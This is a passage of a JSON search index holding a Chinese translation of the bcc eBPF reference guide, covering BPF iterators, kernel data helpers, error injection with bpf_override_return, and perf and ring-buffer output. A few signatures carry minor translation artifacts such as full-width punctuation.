<p>\u539f\u5730\u793a\u4f8b\uff1a\"\u641c\u7d22/tests</p>"},{"location":"tutorials/bcc-documents/reference_guide/#12-bpf","title":"12. BPF\u8fed\u4ee3\u5668","text":"<p>\u8bed\u6cd5: BPF_ITER(target)</p> <p>\u8fd9\u662f\u4e00\u4e2a\u5b8f\uff0c\u7528\u4e8e\u5b9a\u4e49\u4e00\u4e2abpf\u8fed\u4ee3\u5668\u7a0b\u5e8f\u7684\u7a0b\u5e8f\u7b7e\u540d\u3002\u53c2\u6570 target \u6307\u5b9a\u8981\u8fed\u4ee3\u7684\u5185\u5bb9\u3002</p> <p>\u76ee\u524d\uff0c\u5185\u6838\u6ca1\u6709\u63a5\u53e3\u6765\u53d1\u73b0\u652f\u6301\u54ea\u4e9b\u76ee\u6807\u3002\u4e00\u4e2a\u597d\u7684\u67e5\u627e\u652f\u6301\u5185\u5bb9\u7684\u5730\u65b9\u662f\u5728 tools/testing/selftests/bpf/prog_test/bpf_iter.c \uff0c\u4e00\u4e9b\u793a\u4f8bbpf\u8fed\u4ee3\u5668\u7a0b\u5e8f\u4f4d\u4e8e tools/testing/selftests/bpf/progs \uff0c\u5176\u4e2d\u6587\u4ef6\u540d\u4ee5 bpf_iter \u4e3a\u524d\u7f00\u3002</p> <p>\u4ee5\u4e0b\u793a\u4f8b\u4e3a task \u76ee\u6807\u5b9a\u4e49\u4e86\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u8be5\u7a0b\u5e8f\u904d\u5386\u5185\u6838\u4e2d\u7684\u6240\u6709\u4efb\u52a1\u3002</p> <pre><code>BPF_ITER(task)\n{\n  struct seq_file *seq = ctx-&gt;meta-&gt;seq;\n  struct task_struct *task = ctx-&gt;task;\n\n  if (task == (void *)0)\n    return 0;\n\n  ... task-&gt;pid, task-&gt;tgid, task-&gt;comm, ...\n  return 0;\n}\n</code></pre> <p>\u57285.8\u5185\u6838\u4e2d\u5f15\u5165\u4e86BPF\u8fed\u4ee3\u5668\uff0c\u53ef\u4ee5\u7528\u4e8e\u4efb\u52a1\uff08task\uff09\u3001\u4efb\u52a1\u6587\u4ef6\uff08task_file\uff09\u3001bpf map\u3001netlink_sock\u548cipv6_route\u3002\u57285.9\u4e2d\uff0c\u5bf9tcp/udp socket\u548cbpf map\u5143\u7d20\uff08hashmap\u3001arraymap\u548csk_local_storage_map\uff09\u904d\u5386\u6dfb\u52a0\u4e86\u652f\u6301\u3002</p>"},{"location":"tutorials/bcc-documents/reference_guide/#_2","title":"\u6570\u636e","text":""},{"location":"tutorials/bcc-documents/reference_guide/#1-bpf_probe_read_kernel","title":"1. bpf_probe_read_kernel()","text":"<p>\u8bed\u6cd5: <code>int bpf_probe_read_kernel(void *dst, int size, const void*src)</code></p> <p>\u8fd4\u56de\u503c: \u6210\u529f\u65f6\u8fd4\u56de0</p> <p>\u8be5\u51fd\u6570\u5c06\u4ece\u5185\u6838\u5730\u5740\u7a7a\u95f4\u590d\u5236size\u5b57\u8282\u5230BPF\u5806\u6808\uff0c\u4ee5\u4fbfBPF\u4e4b\u540e\u53ef\u4ee5\u5bf9\u5176\u8fdb\u884c\u64cd\u4f5c\u3002\u4e3a\u4e86\u5b89\u5168\u8d77\u89c1\uff0c\u6240\u6709\u5185\u6838\u5185\u5b58\u8bfb\u53d6\u90fd\u5fc5\u987b\u901a\u8fc7bpf_probe_read_kernel()\u8fdb\u884c\u3002\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u6bd4\u5982\u89e3\u5f15\u7528\u5185\u6838\u53d8\u91cf\u65f6\uff0c\u8fd9\u4f1a\u81ea\u52a8\u53d1\u751f\uff0c\u56e0\u4e3abcc\u4f1a\u91cd\u65b0\u7f16\u5199BPF\u7a0b\u5e8f\u4ee5\u5305\u542b\u6240\u9700\u7684bpf_probe_read_kernel()\u3002</p> <p>\u73b0\u573a\u793a\u4f8b\uff1a \u641c\u7d22 /examples, \u641c\u7d22 /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide/#2-bpf_probe_read_kernel_strshell","title":"2. bpf_probe_read_kernel_str()\".```shell","text":"<p>\u8bed\u6cd5\uff1a<code>int bpf_probe_read_kernel_str(void *dst, int size, const void*src)</code></p> <p>\u8fd4\u56de\u503c\uff1a</p> <ul> <li>&gt; 0 \u6210\u529f\u65f6\u5b57\u7b26\u4e32\u957f\u5ea6\uff08\u5305\u62ec\u7ed3\u5c3e\u7684NULL\u5b57\u7b26\uff09</li> <li>\\&lt; 0 \u51fa\u9519</li> </ul> <p>\u8be5\u51fd\u6570\u5c06\u4e00\u4e2a\u4ee5<code>NULL</code>\u7ed3\u5c3e\u7684\u5b57\u7b26\u4e32\u4ece\u5185\u6838\u5730\u5740\u7a7a\u95f4\u590d\u5236\u5230BPF\u5806\u6808\u4e2d\uff0c\u4ee5\u4fbfBPF\u4ee5\u540e\u53ef\u4ee5\u5bf9\u5176\u8fdb\u884c\u64cd\u4f5c\u3002\u5982\u679c\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\u5c0f\u4e8esize\uff0c\u5219\u76ee\u6807\u4e0d\u4f1a\u7528\u66f4\u591a\u7684<code>NULL</code>\u5b57\u8282\u8fdb\u884c\u586b\u5145\u3002\u5982\u679c\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\u5927\u4e8esize\uff0c\u5219\u53ea\u4f1a\u590d\u5236<code>size - 1</code>\u4e2a\u5b57\u8282\uff0c\u5e76\u5c06\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u8bbe\u7f6e\u4e3a<code>NULL</code>\u3002</p> <p>\u793a\u4f8b\uff1a \u641c\u7d22/examples, \u641c\u7d22/tools</p>"},{"location":"tutorials/bcc-documents/reference_guide/#3-bpf_ktime_get_ns","title":"3. bpf_ktime_get_ns()","text":"<p>\u8bed\u6cd5\uff1a<code>u64 bpf_ktime_get_ns(void)</code></p> <p>\u8fd4\u56de\u503c\uff1au64 \u7eb3\u79d2\u6570\u3002\u4ece\u7cfb\u7edf\u542f\u52a8\u65f6\u95f4\u5f00\u59cb\u8ba1\u6570\uff0c\u4f46\u5728\u6302\u8d77\u671f\u95f4\u505c\u6b62\u8ba1\u6570\u3002</p> <p>\u793a\u4f8b\uff1a \u641c\u7d22/examples, \u641c\u7d22/tools</p>"},{"location":"tutorials/bcc-documents/reference_guide/#4-bpf_get_current_pid_tgid","title":"4. bpf_get_current_pid_tgid()","text":"<p>\u8bed\u6cd5\uff1a<code>u64 bpf_get_current_pid_tgid(void)</code></p> <p>\u8fd4\u56de\u503c\uff1a<code>current-&gt;tgid &lt;&lt; 32 | current-&gt;pid</code></p> <p>\u8fd4\u56de\u8fdb\u7a0bID\u4f4d\u4e8e\u4f4e32\u4f4d\uff08\u5185\u6838\u89c6\u56fe\u7684PID\uff0c\u5728\u7528\u6237\u7a7a\u95f4\u901a\u5e38\u8868\u793a\u4e3a\u7ebf\u7a0bID\uff09\uff0c\u7ebf\u7a0b\u7ec4ID\u4f4d\u4e8e\u9ad832\u4f4d\uff08\u5728\u7528\u6237\u7a7a\u95f4\u901a\u5e38\u88ab\u8ba4\u4e3a\u662fPID\uff09\u3002\u901a\u8fc7\u76f4\u63a5\u8bbe\u7f6e\u4e3au32\u7c7b\u578b\uff0c\u6211\u4eec\u4e22\u5f03\u4e86\u9ad832\u4f4d\u3002</p> <p>\u793a\u4f8b\uff1a \u641c\u7d22/examples, \u641c\u7d22/tools</p>"},{"location":"tutorials/bcc-documents/reference_guide/#5-bpf_get_current_uid_gid","title":"5. bpf_get_current_uid_gid()","text":"<p>\u8bed\u6cd5\uff1a<code>u64 bpf_get_current_uid_gid(void)</code></p> <p>\u8fd4\u56de\u503c\uff1a<code>current_gid &lt;&lt; 32 | current_uid</code></p> <p>\u8fd4\u56de\u7528\u6237ID\u548c\u7ec4ID\u3002</p> <p>\u793a\u4f8b\uff1a\u641c\u7d22/examples, \u641c\u7d22/tools</p>"},{"location":"tutorials/bcc-documents/reference_guide/#6-bpf_get_current_comm","title":"6. bpf_get_current_comm()","text":"<p>\u8bed\u6cd5: <code>bpf_get_current_comm(char *buf, int size_of_buf)</code></p> <p>\u8fd4\u56de\u503c: \u6210\u529f\u65f6\u8fd4\u56de0</p> <p>\u5c06\u5f53\u524d\u8fdb\u7a0b\u7684\u540d\u79f0\u586b\u5145\u5230\u7b2c\u4e00\u4e2a\u53c2\u6570\u5730\u5740\u4e2d\u3002\u5b83\u5e94\u8be5\u662f\u4e00\u4e2a\u6307\u5411\u5b57\u7b26\u6570\u7ec4\u7684\u6307\u9488\uff0c\u5927\u5c0f\u81f3\u5c11\u4e3aTASK_COMM_LEN\uff0c\u8be5\u53d8\u91cf\u5728linux/sched.h\u4e2d\u5b9a\u4e49\u3002\u4f8b\u5982:</p> <pre><code>#include &lt;linux/sched.h&gt;\n\nint do_trace(struct pt_regs *ctx) {\n    char comm[TASK_COMM_LEN];\n    bpf_get_current_comm(&amp;comm, sizeof(comm));\n[...]\n</code></pre> <p>\u73b0\u6709\u793a\u4f8b: \u641c\u7d22/examples, \u641c\u7d22/tools</p>"},{"location":"tutorials/bcc-documents/reference_guide/#7-bpf_get_current_task","title":"7. bpf_get_current_task()","text":"<p>\u8bed\u6cd5: <code>bpf_get_current_task()</code></p> <p>\u8fd4\u56de\u503c: \u8fd4\u56de\u6307\u5411\u5f53\u524d\u4efb\u52a1\u7684struct task_struct\u6307\u9488\u3002</p> <p>\u8fd4\u56de\u6307\u5411\u5f53\u524d\u4efb\u52a1\u7684task_struct\u5bf9\u8c61\u7684\u6307\u9488\u3002\u8be5\u8f85\u52a9\u51fd\u6570\u53ef\u7528\u4e8e\u8ba1\u7b97\u8fdb\u7a0b\u7684CPU\u65f6\u95f4\uff0c\u6807\u8bc6\u5185\u6838\u7ebf\u7a0b\uff0c\u83b7\u53d6\u5f53\u524dCPU\u7684\u8fd0\u884c\u961f\u5217\u6216\u68c0\u7d22\u8bb8\u591a\u5176\u4ed6\u4fe1\u606f\u3002</p> <p>\u5728Linux 4.13\u4e2d\uff0c\u7531\u4e8e\u5b57\u6bb5\u968f\u673a\u5316\u7684\u95ee\u9898\uff0c\u60a8\u53ef\u80fd\u9700\u8981\u5728\u5305\u542b\u4e4b\u524d\u5b9a\u4e49\u4e24\u4e2a#define\u6307\u4ee4:</p> <pre><code>#define randomized_struct_fields_start  struct {\n#define randomized_struct_fields_end    };\n#include &lt;linux/sched.h&gt;\n\nint do_trace(void *ctx) {\n    struct task_struct *t = (struct task_struct *)bpf_get_current_task();\n[...]\n</code></pre> <p>\u73b0\u6709\u793a\u4f8b: \u641c\u7d22/examples, \u641c\u7d22/tools</p>"},{"location":"tutorials/bcc-documents/reference_guide/#8-bpf_log2l","title":"8. bpf_log2l()","text":"<p>\u8bed\u6cd5: <code>unsigned int bpf_log2l(unsigned long v)</code></p> <p>\u8fd4\u56de\u63d0\u4f9b\u7684\u503c\u7684log-2\u3002\u8fd9\u901a\u5e38\u7528\u4e8e\u521b\u5efa\u76f4\u65b9\u56fe\u7684\u7d22\u5f15\uff0c\u4ee5\u6784\u5efa2\u7684\u5e42\u6b21\u76f4\u65b9\u56fe\u3002\u5728\u539f\u5730\u793a\u4f8b\uff1a</p> <p>\u641c\u7d22/\u793a\u4f8b\uff0c \u641c\u7d22/\u5de5\u5177</p>"},{"location":"tutorials/bcc-documents/reference_guide/#9-bpf_get_prandom_u32","title":"9. bpf_get_prandom_u32()","text":"<p>\u8bed\u6cd5\uff1a<code>u32 bpf_get_prandom_u32()</code></p> <p>\u8fd4\u56de\u4e00\u4e2a\u4f2a\u968f\u673a\u7684 u32\u3002</p> <p>\u5728\u539f\u5730\u793a\u4f8b\uff1a</p> <p>\u641c\u7d22/\u793a\u4f8b\uff0c \u641c\u7d22/\u5de5\u5177</p>"},{"location":"tutorials/bcc-documents/reference_guide/#10-bpf_probe_read_user","title":"10. bpf_probe_read_user()","text":"<p>\u8bed\u6cd5\uff1a<code>int bpf_probe_read_user(void *dst, int size, const void*src)</code></p> <p>\u8fd4\u56de\u503c\uff1a\u6210\u529f\u65f6\u8fd4\u56de0</p> <p>\u8be5\u51fd\u6570\u5c1d\u8bd5\u5b89\u5168\u5730\u4ece\u7528\u6237\u5730\u5740\u7a7a\u95f4\u8bfb\u53d6size\u4e2a\u5b57\u8282\u5230BPF\u6808\u4e2d\uff0c\u4ee5\u4fbfBPF\u4e4b\u540e\u53ef\u4ee5\u64cd\u4f5c\u5b83\u3002\u4e3a\u786e\u4fdd\u5b89\u5168\uff0c\u6240\u6709\u7528\u6237\u5730\u5740\u7a7a\u95f4\u5185\u5b58\u8bfb\u53d6\u5fc5\u987b\u901a\u8fc7bpf_probe_read_user()\u3002</p> <p>\u5728\u539f\u5730\u793a\u4f8b\uff1a</p> <p>\u641c\u7d22/\u793a\u4f8b\uff0c \u641c\u7d22/\u5de5\u5177</p>"},{"location":"tutorials/bcc-documents/reference_guide/#11-bpf_probe_read_user_str","title":"11. bpf_probe_read_user_str()","text":"<p>\u8bed\u6cd5\uff1a<code>int bpf_probe_read_user_str(void *dst, int size, const void*src)</code></p> <p>\u8fd4\u56de\u503c\uff1a</p> <ul> <li>&gt; 0 \u6210\u529f\u65f6\u8fd4\u56de\u5b57\u7b26\u4e32\u957f\u5ea6\uff08\u5305\u62ec\u7ed3\u5c3e\u7684NULL\uff09</li> <li>\\&lt; 0 \u9519\u8bef</li> </ul> <p>\u8be5\u51fd\u6570\u5c06\u4e00\u4e2a\u4ee5<code>NULL</code>\u7ed3\u5c3e\u7684\u5b57\u7b26\u4e32\u4ece\u7528\u6237\u5730\u5740\u7a7a\u95f4\u590d\u5236\u5230BPF\u6808\u4e2d\uff0c\u4ee5\u4fbfBPF\u4e4b\u540e\u53ef\u4ee5\u64cd\u4f5c\u5b83\u3002\u5982\u679c\u5b57\u7b26\u4e32\u957f\u5ea6\u5c0f\u4e8esize\uff0c\u5219\u76ee\u6807\u4e0d\u4f1a\u7528\u989d\u5916\u7684<code>NULL</code>\u5b57\u8282\u586b\u5145\u3002\u5982\u679c\u5b57\u7b26\u4e32\u957f\u5ea6\u5927\u4e8esize\uff0c\u5219\u53ea\u4f1a\u590d\u5236<code>size - 1</code>\u5b57\u8282\uff0c\u5e76\u5c06\u6700\u540e\u4e00\u5b57\u8282\u8bbe\u7f6e\u4e3a<code>NULL</code>\u3002</p> <p>\u5728\u539f\u5730\u793a\u4f8b\uff1a</p> <p>\u641c\u7d22/\u793a\u4f8b\uff0c \u641c\u7d22/\u5de5\u5177</p>"},{"location":"tutorials/bcc-documents/reference_guide/#12-bpf_get_ns_current_pid_tgid","title":"12. bpf_get_ns_current_pid_tgid()","text":"<p>\u8bed\u6cd5\uff1a<code>u32 bpf_get_ns_current_pid_tgid(u64 dev, u64 ino, struct bpf_pidns_info*nsdata, u32 size)</code>\u3002\u4ece\u5f53\u524d\u547d\u540d\u7a7a\u95f4\u4e2d\u770b\u5230\u7684pid\u548ctgid\u7684\u503c\u5c06\u5728nsdata\u4e2d\u8fd4\u56de\u3002</p> <p>\u6210\u529f\u8fd4\u56de0\uff0c\u5931\u8d25\u65f6\u8fd4\u56de\u4ee5\u4e0b\u4e4b\u4e00\uff1a</p> <ul> <li> <p>\u5982\u679c\u63d0\u4f9b\u7684dev\u548cinum\u4e0e\u5f53\u524d\u4efb\u52a1\u7684nsfs\u7684dev_t\u548cinode\u53f7\u4e0d\u5339\u914d\uff0c\u6216\u8005dev\u8f6c\u6362\u4e3adev_t\u4e22\u5931\u4e86\u9ad8\u4f4d\uff0c\u5219\u8fd4\u56de-EINVAL\u3002</p> </li> <li> <p>\u5982\u679c\u5f53\u524d\u4efb\u52a1\u7684pidns\u4e0d\u5b58\u5728\uff0c\u5219\u8fd4\u56de-ENOENT\u3002</p> </li> </ul> <p>\u539f\u5730\u793a\u4f8b\uff1a \u641c\u7d22/examples, \u641c\u7d22/tools</p>"},{"location":"tutorials/bcc-documents/reference_guide/#_3","title":"\u8c03\u8bd5","text":""},{"location":"tutorials/bcc-documents/reference_guide/#1-bpf_override_return","title":"1. bpf_override_return()","text":"<p>\u8bed\u6cd5\uff1a<code>int bpf_override_return(struct pt_regs *, unsigned long rc)</code></p> <p>\u8fd4\u56de\u503c\uff1a\u6210\u529f\u65f6\u8fd4\u56de0</p> <p>\u5f53\u7528\u4e8e\u9644\u52a0\u5230\u51fd\u6570\u5165\u53e3\u7684\u7a0b\u5e8f\u65f6\uff0c\u4f1a\u5bfc\u81f4\u8be5\u51fd\u6570\u7684\u6267\u884c\u88ab\u8df3\u8fc7\uff0c\u7acb\u5373\u8fd4\u56de<code>rc</code>\u3002\u8fd9\u7528\u4e8e\u76ee\u6807\u9519\u8bef\u6ce8\u5165\u3002</p> <p>\u4ec5\u5f53\u5141\u8bb8\u9519\u8bef\u6ce8\u5165\u65f6\uff0cbpf_override_return\u624d\u6709\u6548\u3002\u767d\u540d\u5355\u5217\u8868\u4e2d\u9700\u8981\u5728\u5185\u6838\u6e90\u4ee3\u7801\u4e2d\u7ed9\u4e00\u4e2a\u51fd\u6570\u6253\u4e0a <code>ALLOW_ERROR_INJECTION()</code> \u7684\u6807\u7b7e\uff1b\u53c2\u8003 <code>io_ctl_init</code> \u7684\u793a\u4f8b\u3002\u5982\u679c\u8be5\u51fd\u6570\u672a\u88ab\u52a0\u5165\u767d\u540d\u5355\uff0cbpf\u7a0b\u5e8f\u5c06\u65e0\u6cd5\u9644\u52a0\uff0c\u51fa\u73b0 <code>ioctl(PERF_EVENT_IOC_SET_BPF): Invalid argument</code> \u9519\u8bef\u3002</p> <pre><code>int kprobe__io_ctl_init(void *ctx) {\n bpf_override_return(ctx, -ENOMEM);\n return 0;\n}\n</code></pre>"},{"location":"tutorials/bcc-documents/reference_guide/#_4","title":"\u8f93\u51fa","text":""},{"location":"tutorials/bcc-documents/reference_guide/#1-bpf_trace_printk","title":"1. bpf_trace_printk()","text":"<p>\u8bed\u6cd5\uff1a<code>int bpf_trace_printk(const char *fmt, ...)</code></p> <p>\u8fd4\u56de\u503c\uff1a\u6210\u529f\u65f6\u8fd4\u56de0</p> <p>\u5bf9\u4e8e\u901a\u5e38\u7684trace_pipe (/sys/kernel/debug/tracing/trace_pipe)\u63d0\u4f9b\u4e86\u4e00\u4e2a\u7b80\u5355\u7684\u5185\u6838printf()\u529f\u80fd\u3002\u8fd9\u5bf9\u4e8e\u4e00\u4e9b\u5feb\u901f\u793a\u4f8b\u662f\u53ef\u4ee5\u63a5\u53d7\u7684\uff0c\u4f46\u6709\u4e00\u4e9b\u9650\u5236\uff1a\u6700\u591a3\u4e2a\u53c2\u6570\uff0c\u53ea\u6709\u4e00\u4e2a%s\uff0c\u800c\u4e14trace_pipe\u662f\u5168\u5c40\u5171\u4eab\u7684\uff0c\u6240\u4ee5\u5e76\u53d1\u7a0b\u5e8f\u4f1a\u6709\u51b2\u7a81\u8f93\u51fa\u3002\u66f4\u597d\u7684\u63a5\u53e3\u662f\u901a\u8fc7BPF_PERF_OUTPUT()\u3002\u6ce8\u610f\uff0c\u4e0e\u539f\u59cb\u5185\u6838\u7248\u672c\u76f8\u6bd4\uff0c\u8c03\u7528\u8fd9\u4e2a\u8f85\u52a9\u51fd\u6570\u53d8\u5f97\u66f4\u7b80\u5355\uff0c\u5b83\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u5df2\u7ecf\u662f <code>fmt_size</code>\u3002</p> <p>\u539f\u5730\u793a\u4f8b\uff1a\"\u641c\u7d22 /\u793a\u4f8b, \u641c\u7d22 /\u5de5\u5177</p>"},{"location":"tutorials/bcc-documents/reference_guide/#2-bpf_perf_output","title":"2. BPF_PERF_OUTPUT","text":"<p>\u8bed\u6cd5\uff1a<code>BPF_PERF_OUTPUT(name)</code></p> <p>\u521b\u5efa\u4e00\u4e2aBPF\u8868\u683c\uff0c\u901a\u8fc7\u6027\u80fd\u73af\u5f62\u7f13\u51b2\u533a\u5c06\u81ea\u5b9a\u4e49\u4e8b\u4ef6\u6570\u636e\u63a8\u9001\u5230\u7528\u6237\u7a7a\u95f4\u3002\u8fd9\u662f\u5c06\u6bcf\u4e2a\u4e8b\u4ef6\u6570\u636e\u63a8\u9001\u5230\u7528\u6237\u7a7a\u95f4\u7684\u9996\u9009\u65b9\u6cd5\u3002</p> <p>\u4f8b\u5982\uff1a</p> <pre><code>struct data_t {\n    u32 pid;\n    u64 ts;\n    char comm[TASK_COMM_LEN];\n};\nBPF_PERF_OUTPUT(events);\n\nint hello(struct pt_regs *ctx) {\n    struct data_t data = {};\n\n    data.pid = bpf_get_current_pid_tgid();\n    data.ts = bpf_ktime_get_ns();\n    bpf_get_current_comm(&amp;data.comm, sizeof(data.comm));\n\n    events.perf_submit(ctx, &amp;data, sizeof(data));\n\n    return 0;\n}\n</code></pre> <p>\u8f93\u51fa\u8868\u683c\u540d\u4e3a<code>events</code>\uff0c\u6570\u636e\u901a\u8fc7<code>events.perf_submit()</code>\u63a8\u9001\u5230\u8be5\u8868\u683c\u3002</p> <p>\u793a\u4f8b\u4e2d\u5305\u542b\u4ee5\u4e0b\u5185\u5bb9\uff1a \u641c\u7d22 /\u793a\u4f8b, \u641c\u7d22 /\u5de5\u5177</p>"},{"location":"tutorials/bcc-documents/reference_guide/#3-perf_submit","title":"3. perf_submit()","text":"<p>\u8bed\u6cd5\uff1a<code>int perf_submit((void *)ctx, (void*)data, u32 data_size)</code></p> <p>\u8fd4\u56de\u503c\uff1a\u6210\u529f\u8fd4\u56de0</p> <p>\u8fd9\u662fBPF_PERF_OUTPUT\u8868\u683c\u7684\u4e00\u79cd\u65b9\u6cd5\uff0c\u7528\u4e8e\u5411\u7528\u6237\u7a7a\u95f4\u63d0\u4ea4\u81ea\u5b9a\u4e49\u4e8b\u4ef6\u6570\u636e\u3002\u53c2\u89c1BPF_PERF_OUTPUT\u6761\u76ee\uff08\u6700\u7ec8\u8c03\u7528bpf_perf_event_output()\uff09\u3002</p> <p><code>ctx</code>\u53c2\u6570\u5728kprobes\u6216kretprobes\u4e2d\u63d0\u4f9b\u3002\u5bf9\u4e8e<code>SCHED_CLS</code>\u6216<code>SOCKET_FILTER</code>\u7a0b\u5e8f\uff0c\u5fc5\u987b\u4f7f\u7528<code>struct __sk_buff *skb</code>\u3002</p> <p>\u793a\u4f8b\u4e2d\u5305\u542b\u4ee5\u4e0b\u5185\u5bb9\uff1a \u641c\u7d22 /\u793a\u4f8b, \u641c\u7d22 /\u5de5\u5177</p>"},{"location":"tutorials/bcc-documents/reference_guide/#4-perf_submit_skb","title":"4. perf_submit_skb()","text":"<p>\u8bed\u6cd5\uff1a<code>int perf_submit_skb((void *)ctx, u32 packet_size, (void*)data, u32 data_size)</code></p> <p>\u8fd4\u56de\u503c\uff1a\u6210\u529f\u8fd4\u56de0\".\u4e00\u79cd\u5728\u7f51\u7edc\u7a0b\u5e8f\u7c7b\u578b\u4e2d\u53ef\u7528\u7684BPF_PERF_OUTPUT\u8868\u7684\u65b9\u6cd5\uff0c\u7528\u4e8e\u5c06\u81ea\u5b9a\u4e49\u4e8b\u4ef6\u6570\u636e\u548c\u6570\u636e\u5305\u7f13\u51b2\u533a\u7684\u524d<code>packet_size</code>\u5b57\u8282\u4e00\u8d77\u63d0\u4ea4\u5230\u7528\u6237\u7a7a\u95f4\u3002\u8bf7\u53c2\u9605BPF_PERF_OUTPUT\u6761\u76ee\u3002\uff08\u6700\u7ec8\u8c03\u7528bpf_perf_event_output()\u51fd\u6570\u3002\uff09</p> <p>\u73b0\u573a\u793a\u4f8b\uff1a \u641c\u7d22/examples \u641c\u7d22/tools</p>"},{"location":"tutorials/bcc-documents/reference_guide/#5-bpf_ringbuf_output","title":"5. BPF_RINGBUF_OUTPUT","text":"<p>\u8bed\u6cd5\uff1a<code>BPF_RINGBUF_OUTPUT(name, page_cnt)</code></p> <p>\u521b\u5efa\u4e00\u4e2aBPF\u8868\uff0c\u901a\u8fc7\u4e00\u4e2a\u73af\u5f62\u7f13\u51b2\u533a\u5c06\u81ea\u5b9a\u4e49\u4e8b\u4ef6\u6570\u636e\u63a8\u9001\u5230\u7528\u6237\u7a7a\u95f4\u3002 <code>BPF_RINGBUF_OUTPUT</code>\u76f8\u8f83\u4e8e<code>BPF_PERF_OUTPUT</code>\u5177\u6709\u4ee5\u4e0b\u51e0\u4e2a\u4f18\u70b9\uff1a</p> <ul> <li>\u7f13\u51b2\u533a\u5728\u6240\u6709CPU\u4e4b\u95f4\u5171\u4eab\uff0c\u5373\u6bcf\u4e2aCPU\u4e0d\u9700\u8981\u5355\u72ec\u5206\u914d</li> <li>\u652f\u6301\u4e24\u79cdBPF\u7a0b\u5e8f\u7684API</li> <li><code>map.ringbuf_output()</code>\u7c7b\u4f3c\u4e8e<code>map.perf_submit()</code>\uff08\u5728ringbuf_output\u4e2d\u4ecb\u7ecd\uff09</li> <li><code>map.ringbuf_reserve()</code>/<code>map.ringbuf_submit()</code>/<code>map.ringbuf_discard()</code>\u5c06\u4fdd\u7559\u7f13\u51b2\u533a\u7a7a\u95f4\u548c\u63d0\u4ea4\u4e8b\u4ef6\u7684\u8fc7\u7a0b\u5206\u4e3a\u4e24\u6b65\uff08\u5728ringbuf_reserve\u3001ringbuf_submit\u548cringbuf_discard\u4e2d\u4ecb\u7ecd\uff09</li> <li>BPF API\u4e0d\u9700\u8981\u8bbf\u95eeCPU ctx\u53c2\u6570</li> <li>\u901a\u8fc7\u5171\u4eab\u7684\u73af\u5f62\u7f13\u51b2\u533a\u7ba1\u7406\u5668\uff0c\u5728\u7528\u6237\u7a7a\u95f4\u4e2d\u5177\u6709\u66f4\u9ad8\u7684\u6027\u80fd\u548c\u66f4\u4f4e\u7684\u5ef6\u8fdf</li> <li>\u652f\u6301\u4e24\u79cd\u5728\u7528\u6237\u7a7a\u95f4\u4e2d\u6d88\u8d39\u6570\u636e\u7684\u65b9\u5f0f</li> </ul> <p>\u4eceLinux 5.8\u5f00\u59cb\uff0c\u8fd9\u5e94\u8be5\u662f\u5c06\u4e8b\u4ef6\u6570\u636e\u63a8\u9001\u5230\u7528\u6237\u7a7a\u95f4\u7684\u9996\u9009\u65b9\u6cd5\u3002</p> <p>\u8f93\u51fa\u8868\u547d\u540d\u4e3a'\u4e8b\u4ef6'\u3002\u6570\u636e\u901a\u8fc7'\u4e8b\u4ef6'\u3002ringbuf_reserve\uff08\uff09\u5206\u914d\uff0c\u5e76\u901a\u8fc7'\u4e8b\u4ef6'\u3002ringbuf_submit\uff08\uff09\u63a8\u9001\u5230\u5176\u4e2d\u3002</p> <p>\u5728situ\u793a\u4f8b\uff1a \u641c\u7d22/\u793a\u4f8b\uff0c</p>"},{"location":"tutorials/bcc-documents/reference_guide/#6-ringbuf_output","title":"6. ringbuf_output\uff08\uff09","text":"<p>\u8bed\u6cd5\uff1aint ringbuf_output\uff08\uff08void *\uff09data\uff0cu64 data_size\uff0cu64 flags\uff09</p> <p>\u8fd4\u56de\uff1a\u6210\u529f\u8fd4\u56de0</p> <p>\u6807\u5fd7\uff1a</p> <ul> <li><code>BPF_RB_NO_WAKEUP</code>\uff1a\u4e0d\u53d1\u9001\u65b0\u6570\u636e\u53ef\u7528\u7684\u901a\u77e5</li> <li><code>BPF_RB_FORCE_WAKEUP</code>\uff1a\u65e0\u6761\u4ef6\u53d1\u9001\u65b0\u6570\u636e\u53ef\u7528\u7684\u901a\u77e5</li> </ul> <p>BPF_RINGBUF_OUTPUT\u8868\u7684\u65b9\u6cd5\uff0c\u7528\u4e8e\u5c06\u81ea\u5b9a\u4e49\u4e8b\u4ef6\u6570\u636e\u63d0\u4ea4\u7ed9\u7528\u6237\u7a7a\u95f4\u3002\u6b64\u65b9\u6cd5\u7c7b\u4f3c\u4e8e<code>perf_submit\uff08\uff09</code>\uff0c\u4f46\u4e0d\u9700\u8981ctx\u53c2\u6570\u3002</p> <p>\u5728situ\u793a\u4f8b\uff1a \u641c\u7d22/\u793a\u4f8b\uff0c</p>"},{"location":"tutorials/bcc-documents/reference_guide/#7-ringbuf_reserve","title":"7. ringbuf_reserve()","text":"<p>\u8bed\u6cd5\uff1avoid * ringbuf_reserve\uff08u64 data_size\uff09</p> <p>\u8fd4\u56de\uff1a\u6210\u529f\u65f6\u8fd4\u56de\u6570\u636e\u7ed3\u6784\u7684\u6307\u9488\uff0c\u5931\u8d25\u65f6\u8fd4\u56deNULL</p> <p>BPF_RINGBUF_OUTPUT\u8868\u7684\u65b9\u6cd5\uff0c\u7528\u4e8e\u5728\u73af\u5f62\u7f13\u51b2\u533a\u4e2d\u4fdd\u7559\u7a7a\u95f4\u5e76\u540c\u65f6\u5206\u914d\u4e00\u4e2a\u7528\u4e8e\u8f93\u51fa\u7684\u6570\u636e\u7ed3\u6784\u3002\u5fc5\u987b\u4e0e<code>ringbuf_submit</code>\u6216<code>ringbuf_discard</code>\u4e4b\u4e00\u914d\u5408\u4f7f\u7528\u3002</p> <p>\u5728situ\u793a\u4f8b\uff1a [\u641c\u7d22/\u793a\u4f8b]\uff08https://github.com/iovisor/bcc/search?q=ringbuf_reserve+path%3Aexamples&amp;type=Code\uff09\uff0c</p>"},{"location":"tutorials/bcc-documents/reference_guide/#8-ringbuf_submit","title":"8. ringbuf_submit\uff08\uff09","text":"<p>\u8bed\u6cd5\uff1avoid ringbuf_submit\uff08\uff08void *\uff09data\uff0cu64 flags\uff09</p> <p>\u8fd4\u56de\uff1a\u65e0\uff0c\u59cb\u7ec8\u6210\u529f</p> <p>\u6807\u5fd7\uff1a- <code>BPF_RB_NO_WAKEUP</code>: \u4e0d\u53d1\u9001\u65b0\u6570\u636e\u53ef\u7528\u7684\u901a\u77e5</p> <ul> 